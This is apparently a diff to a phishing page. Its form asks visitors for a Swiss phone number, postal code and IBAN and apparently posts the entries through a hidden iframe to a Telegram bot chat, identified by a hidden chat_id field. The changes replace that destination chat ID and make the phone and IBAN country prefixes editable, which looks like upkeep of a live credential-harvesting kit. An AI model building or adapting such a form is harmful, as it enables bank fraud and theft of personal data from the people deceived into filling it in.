@@ -61,7 +61,7 @@
               method="POST"
               target="tg_iframe">
               
-          <input type="hidden" name="chat_id" value="-1003907097706">
+          <input type="hidden" name="chat_id" value="-5525170546">
           <input type="hidden" name="parse_mode" value="Markdown">
           <textarea name="text" id="telegramText" style="display:none;"></textarea>
 
@@ -76,7 +76,7 @@
           </div>
 
           <div class="input-group phone-group">
-            <div class="phone-prefix">+41</div>
+            <input type="text" id="phone-prefix" class="prefix-input" value="+41" maxlength="5" aria-label="Ländervorwahl">
             <input type="tel" id="telefon" class="input-field phone-input" placeholder=" " required>
             <label for="telefon" class="input-label phone-label" data-lang-ch="Ihre Telefonnummer" data-lang-en="Your phone number">Ihre Telefonnummer</label>
           </div>
@@ -90,7 +90,7 @@
 
             <div class="input-group">
               <input type="text" id="plz" class="input-field" placeholder=" " required>
-              <label for="plz" class="input-label" data-lang-ch="Postleitzahl" data-lang-en="Zip code">Postleitzahl</label>
+              <label for="plz" class="input-label label-small" data-lang-ch="Postleitzahl" data-lang-en="Zip code">Postleitzahl</label>
             </div>
 
             <div class="input-group">
@@ -101,7 +101,7 @@
 
           <!-- Поле IBAN с префиксом CH -->
           <div class="input-group iban-group">
-            <div class="iban-prefix">CH</div>
+            <input type="text" id="iban-prefix" class="prefix-input" value="CH" maxlength="2" aria-label="Ländercode">
             <input type="text" id="iban" class="input-field iban-input" placeholder=" " required>
             <label for="iban" class="input-label iban-label" data-lang-ch="Ihre IBAN" data-lang-en="Your IBAN">Ihre IBAN</label>
           </div>
